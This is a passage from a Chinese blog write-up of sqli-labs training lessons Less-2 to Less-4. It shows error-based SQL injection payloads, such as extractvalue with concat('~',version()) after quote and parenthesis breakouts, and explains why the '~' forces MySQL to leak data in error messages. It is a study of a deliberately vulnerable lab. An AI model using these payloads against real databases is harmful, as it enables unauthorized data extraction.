+&lt;p>初始提示一样，尝试&lt;code>?id=1 and 1=1&lt;/code>和&lt;code>?id=1 and 1=0&lt;/code>之后发现存在注入，提示 Error-Based，选择和上一题同样的 Payload 去掉&lt;code>'&lt;/code>可破。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509163615943.png"
+width="1172"
+height="351"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509163615943"
+class="gallery-image"
+data-flex-grow="333"
+data-flex-basis="801px"
+>&lt;/p>
+&lt;h3 id="less-3-error-based-single-quotes-with-twist">Less-3 Error-Based Single-quotes with twist&lt;/h3>
+&lt;p>一样的提示。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509163747743.png"
+width="1028"
+height="250"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509163747743"
+class="gallery-image"
+data-flex-grow="411"
+data-flex-basis="986px"
+>&lt;/p>
+&lt;p>但这题有点不一样的地方，尝试&lt;code>?id=1' and 1=1 --%20&lt;/code>会发现依然报 SQL 语法错误。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509164101687.png"
+width="1171"
+height="186"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509164101687"
+class="gallery-image"
+data-flex-grow="629"
+data-flex-basis="1510px"
+>&lt;/p>
+&lt;p>试了下&lt;code>?id=1; -- %20&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165114088.png"
+width="1252"
+height="199"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165114088"
+class="gallery-image"
+data-flex-grow="629"
+data-flex-basis="1509px"
+>&lt;/p>
+&lt;p>没辙了，看一眼参考答案（源码）。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509164941721.png"
+width="541"
+height="23"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509164941721"
+class="gallery-image"
+data-flex-grow="2352"
+data-flex-basis="5645px"
+>&lt;/p>
+&lt;p>所以是我少给了个&lt;code>)&lt;/code>。这时候才后知后觉发现语法错误报错里已经有提示了，&lt;code>near '; -- ') LIMIT 0,1&lt;/code>，这里有个右半括号。&lt;/p>
+&lt;p>所以把第一题的 payload 改一下，&lt;code>?id=1') and extractvalue(1,concat('~',version())) --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165259349.png"
+width="772"
+height="203"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165259349"
+class="gallery-image"
+data-flex-grow="380"
+data-flex-basis="912px"
+>&lt;/p>
+&lt;p>这关就算 pass 了。&lt;/p>
+&lt;p>教训是不要忽视细节。&lt;/p>
+&lt;h3 id="less-4-error-based-double-quotes">Less-4 Error-Based Double Quotes&lt;/h3>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165419151.png"
+width="1142"
+height="367"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165419151"
+class="gallery-image"
+data-flex-grow="311"
+data-flex-basis="746px"
+>&lt;/p>
+&lt;p>提示 &lt;code>DoubleQuotes&lt;/code>，MySQL 的字符串可以用双引号 &lt;code>&amp;quot;&lt;/code>，这里试一下 Payload &lt;code>?id=1&amp;quot; and 1=0&lt;/code>。&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165543942.png"
+width="1213"
+height="209"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165543942"
+class="gallery-image"
+data-flex-grow="580"
+data-flex-basis="1392px"
+>&lt;/p>
+&lt;p>发现有错误，从错误信息来看有个&lt;code>&amp;quot;)&lt;/code>，我们稍微改下 paylaod 再加上注释符：&lt;code>?id=1&amp;quot;) and 1=0; --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165724792.png"
+width="1091"
+height="314"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165724792"
+class="gallery-image"
+data-flex-grow="347"
+data-flex-basis="833px"
+>&lt;/p>
+&lt;p>成功，现在还是用 &lt;code>extractvalue&lt;/code> 提取信息：&lt;code>?id=1&amp;quot;) and extractvalue(1,concat('~',version())); --%20&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://weakptr.site/p/sqli-labs-training-1/image-20220509165834583.png"
+width="781"
+height="196"
+srcset="https://weakptr.site/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_480x0_resize_box_3.png 480w, https://weakptr.site/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220509165834583"
+class="gallery-image"
+data-flex-grow="398"
+data-flex-basis="956px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>吸收的教训还是两个字，细心。&lt;/p>
+&lt;p>另外还有个关于 payload 的问题。error-based injection 需要错误回显里给出参数字段的值，满足这个条件的函数不多，我只知道 &lt;code>updatexml&lt;/code> 和&lt;code>extractvalue&lt;/code>是肯定ok的，前一篇 red tiger 的打靶笔记里记录了另外两种方法（BIGINT UNSIGNED溢出和&lt;code>ST_LongFromGeoHash&lt;/code>，溢出法在 5.7好像不行了）但少有用起来。&lt;/p>
+&lt;p>在使用 &lt;code>extractvalue&lt;/code> 这个 payload 过程里会有疑问，为什么要有一个&lt;code>concat('~', version())&lt;/code> 而不是直接 &lt;code>extractvalue(1,version())&lt;/code>？其实实测一下就会发现 dump 出来的数据不完整或者干脆不报错。原因也很简单，&lt;code>extractvalue&lt;/code>是个&lt;code>xml&lt;/code>函数，第二个参数是&lt;code>xpath&lt;/code>。&lt;code>xpath&lt;/code>的语法正好会允许很多格式的数据，比如单纯整数或单词，当成合法的&lt;code>xpath&lt;/code>表达式。&lt;/p>
+&lt;p>比如上面的 Less-4 ，用 &lt;code>?id=1&amp;quot;) and extractvalue(1,database()); --%20&lt;/code>这个payload会发现页面不报错，因为&lt;code>database()&lt;/code>返回的&lt;code>security&lt;/code>正好可以当成&lt;code>xpath&lt;/code>表达式被识别，虽然没从第一个参数里提取出任何东西，但也没触发MySQL错误，也就拿不到第二参数的内容了。&lt;/p>
+&lt;p>看似没用的&lt;code>concat('~', col)&lt;/code>，但实际上起到一个重要作用。它添加的一个&lt;code>~&lt;/code>让参数不论是什么格式，都不能当成&lt;code>xpath&lt;/code>识别，也就让 MySQL 能稳定地抛出错误，让我们稳定地从错误信息里拿到&lt;code>extractvalue&lt;/code>第二参数的内容。&lt;/p></description></item></channel></rss>
